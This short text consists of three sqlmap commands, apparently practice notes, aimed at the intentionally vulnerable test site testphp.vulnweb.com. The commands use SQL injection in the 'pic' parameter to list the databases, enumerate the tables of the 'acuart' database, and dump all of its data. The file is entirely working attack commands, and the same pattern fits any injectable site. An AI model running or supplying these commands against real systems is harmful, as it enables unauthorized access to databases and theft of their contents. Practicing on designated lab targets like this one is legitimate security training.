sqlmap -u http://testphp.vulnweb.com/product.php?pic=1 --dbs

sqlmap -u http://testphp.vulnweb.com/product.php?pic=1 -D acuart --tables  

sqlmap -u http://testphp.vulnweb.com/product.php?pic=1 -D acuart --dump-all  